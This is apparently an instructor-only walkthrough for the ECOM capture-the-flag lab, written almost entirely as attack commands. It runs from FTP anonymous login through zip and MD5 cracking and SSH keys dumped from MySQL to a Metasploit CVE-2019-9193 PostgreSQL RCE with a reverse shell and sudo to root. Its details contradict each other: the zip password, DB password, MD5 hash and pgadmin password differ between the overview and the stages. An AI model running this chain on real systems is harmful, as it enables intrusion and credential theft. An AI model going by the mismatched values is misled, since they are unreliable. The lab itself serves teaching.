# ECOM Lab — Challenge Walkthrough
## Instructor Reference Only

---

## Attack Chain Overview

```
nmap scan
  → FTP anonymous login
    → encrypted zip (bruteforce: sunshine95)
      → DB creds in logs (dbadmin:Welc0me2024!)
        → MySQL dump
          → SSH private keys (charlie works)
            → SSH as charlie
              → flag1 + hash hint
                → crack MD5 hash (sunshine95)
                  → psql pgadmin:sunshine95
                    → Metasploit CVE-2019-9193 RCE
                      → root shell + flag2
```

---

## Stage 1 — Reconnaissance & FTP

```bash
# Discover open ports
nmap -sV -Pn <TARGET_IP>
# Open: 21/ftp, 22/ssh, 3306/mysql, 5432/postgresql

# Connect to FTP anonymously
ftp <TARGET_IP>
# Username: anonymous | Password: (blank or any email)

# Navigate and download everything
ftp> ls
ftp> cd pub
ftp> ls -R
ftp> mget *            # download all files
```

**Files found:**
- `logs/access_2024_01.log` — decoy, mentions backup
- `logs/access_2024_02.log` — decoy
- `reports/q1_summary.txt` — decoy
- `reports/q2_summary.txt` — decoy
- `backups/db_backup_march.zip` — **encrypted**

---

## Stage 2 — Crack the ZIP

```bash
# Extract hash from zip
zip2john db_backup_march.zip > zip.hash

# Crack with John + rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

# Password found: monkey1987  (takes a few minutes in rockyou)

# Extract the zip
unzip -P monkey1987 db_backup_march.zip
```

**Inside the zip:**
- `logs/db_maintenance_2024_03.log` — contains cleartext DB creds
- `logs/error_2024_03.log` — decoy errors

**Creds extracted from log:**
```
user=dbadmin password=C0rp0r4te#2024 database=internaldb
```

---

## Stage 3 — MySQL Enumeration

```bash
mysql -h <TARGET_IP> -u dbadmin -p'C0rp0r4te#2024' internaldb

# Dump tables
SHOW TABLES;

# Table: employees — decoy data (names, emails, departments)
SELECT * FROM employees;

# Table: projects — decoy data
SELECT * FROM projects;

# Table: ssh_users — THE GOODS
SELECT username, ssh_private_key, note FROM ssh_users;
```

**Keys found:**
- `alice` — note says "decommissioned" (decoy)
- `charlie` — note says "Monitoring access - active" (**use this one**)

---

## Stage 4 — SSH Access as Charlie

```bash
# Save charlie's key to a file
# (copy from DB output)
nano charlie.key
chmod 600 charlie.key

# Connect
ssh -i charlie.key charlie@<TARGET_IP>
```

**Files in charlie's home:**
- `flag.txt` → **Flag 1:** `ECOM{y0u_f0und_the_s3cr3t_flag_nice_work}`
- `notes.txt` → Contains MD5 hash: `d5961b48a4c9b57fa289155b3e64620a` + hint about pgadmin on port 5432

---

## Stage 5 — Crack the Hash

```bash
# Save hash
echo "3a6d42c88c2b5f1a7dfe23c4b89a0e7f" > hash.txt

# Crack with hashcat (MD5)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Or with John
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Password: redteam2024
```

---

## Stage 6 — PostgreSQL → RCE via CVE-2019-9193

```bash
# Verify connection
psql -h <TARGET_IP> -U pgadmin -W
# Password: sunshine95

# Metasploit exploit
msfconsole

use exploit/multi/postgres/postgres_copy_from_program_cmd_exec
set RHOSTS <TARGET_IP>
set USERNAME pgadmin
set PASSWORD redteam2024
set LHOST <YOUR_KALI_IP>
run
```

**Shell as postgres user. Escalate to root:**

```bash
# Check sudo rights (pgadmin is in sudo group, but we're postgres)
# Check SUID or sudo -l

sudo -l
# In this lab: postgres can run /bin/bash as root

sudo /bin/bash
# Or via: sudo su

cat /root/root_flag.txt
# ECOM{r00t_fl4g_y0u_0wn3d_th3_b0x_gg}
```

---

## Teaching Points

| Stage | Concept |
|-------|---------|
| FTP anon | Exposed services, unnecessary anonymous access |
| ZIP bruteforce | Password strength, offline cracking with rockyou |
| DB creds in logs | Sensitive data in plaintext logs, log hygiene |
| SSH key in DB | Secrets should never be stored in databases |
| Hash cracking | MD5 is weak, rockyou wordlist, credential hygiene |
| CVE-2019-9193 | Unpatched PostgreSQL COPY TO/FROM PROGRAM (RCE as postgres service user) |
| Privilege escalation | Sudo misconfiguration |
